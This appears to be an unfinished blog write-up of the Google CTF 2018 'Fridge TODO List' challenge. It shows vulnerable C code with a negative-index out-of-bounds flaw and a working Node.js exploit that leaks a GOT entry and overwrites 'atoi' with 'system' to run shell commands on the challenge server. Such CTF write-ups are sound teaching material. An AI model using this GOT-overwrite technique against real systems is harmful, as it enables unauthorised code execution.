# Finding Cakes at Google CTF 2018

(Intro TODO)

## Fridge TODO List

The source code of the vulnerable program is included in the attachment.
Reading over it, it's not hard to see what's vulnerable, but how to exploit it
is another question:

```C
// [...]

void store_todo() {
  printf("In which slot would you like to store the new entry? ");
  fflush(stdout);
  int idx = read_int();
  if (idx > TODO_COUNT) {
    puts(OUT_OF_BOUNDS_MESSAGE);
    return;
  }
  printf("What's your TODO? ");
  fflush(stdout);
  read_line(&todos[idx*TODO_LENGTH], TODO_LENGTH);
}

void print_todo() {
  printf("Which entry would you like to read? ");
  fflush(stdout);
  int idx = read_int();
  if (idx > TODO_COUNT) {
    puts(OUT_OF_BOUNDS_MESSAGE);
    return;
  }
  printf("Your TODO: %s\n", &todos[idx*TODO_LENGTH]);
}

// [...]
```

If I enter a negative number, I can read and write data out of bound. However,
`TODO_LENGTH` is `0x30`, with some math and a disassembler, I found places
that I can access:

```
-6  The "write" function in the GOT
-5  The "strncat" function in the GOT
-4  The "open" function in the Global Offset Table (GOT)
-3  Some random place
-2  Start of "username" buffer
-1  Middle of "username" buffer
```

The `system` function in between `write` and `strncat` would allow me to
execute any shell command, so my goal should be to overwrite the GOT and make
some other function point to `system`. Since `atoi` is used to parse my menu
choice input, it would be easy to exploit if I can make `atoi` point to
`system`. But there is another problem, modern operating systems have ASLR,
and a static payload would not work.

I spent some time creating a 
[Node.js library](https://github.com/jspenguin2017/Blog/tree/master/tools/lib)
that allow my scripts to react to different server response over `netcat`.
Since I can't directly read the address of `system`, I have to calculate it
based on something. `strncat` is already called before I can overwrite the GOT,
but `write` is only called when the program is exiting, so the GOT entry should
be still pointing to the Procedure Linkage Table (PLT). With Hopper
Disassembler, I determined that the `system` entry in PLT is `0x30` below
`write`. Hopefully it'll work:

```JavaScript
"use strict";

const assert = require("assert");
const nc = require("./lib/netcat");
const hex = require("./lib/hexutil");

const conn = new nc("fridge-todo-list.ctfcompetition.com", 1337);

(async () => {
    // Log in
    await conn.read_until("user:");
    conn.write_line("root");

    await conn.read_until(">");
    conn.write_line("2");

    // Leak address of "write" in the GOT
    await conn.read_until("read?");
    conn.write_line("-6");

    await conn.read_until("TODO: ");
    let data = await conn.read_until("Hi root");

    const i = data.indexOf("\n\n");
    assert(i !== -1);
    data = data.slice(0, i);
    hex.add(data, 0x30);

    // Overwrite "atoi" with "system", corrupting "open" on the way
    await conn.read_until(">");
    conn.write_line("3");

    await conn.read_until("entry?");
    conn.write_line("-4");

    await conn.read_until("TODO?");
    conn.write("A".repeat(8)); conn.write(data); conn.write("\n");

    // List directory
    await conn.read_until(">");
    conn.write_line("ls -al ./todos");
})();
```

Let's try it:

```
$ node exploit
[...]
> ls -al ./todos
total 12
drwxrwxrwt 2 user user   80 Jul  8 03:47 .
drwxr-xr-x 3 user user 4096 Jun 29 14:38 ..
-rw-r--r-- 1 user user 6144 Jul  8 03:47 CountZero
-rw------- 1 user user    0 Jul  8 03:47 root
[...]
```

Looks like Wintermuted is using `CountZero` as his username:

```
$ nc fridge-todo-list.ctfcompetition.com 1337
[...]
user: CountZero
+=====+=================================================================+
|   0 | Watch Hackers (again)                                           |
|   1 | Figure out why the fridge keeps beeping                         |
|   2 | check /home/user/holey_beep                                     |
|   3 | debug the fridge - toilet connectivity                          |
|   4 | follow sec advice: CTF{goo.gl/cjHknW}                           |
+=====+=================================================================+
[...]
```

And there is the flag. Check `/home/user/holey_beep`? What does that mean?
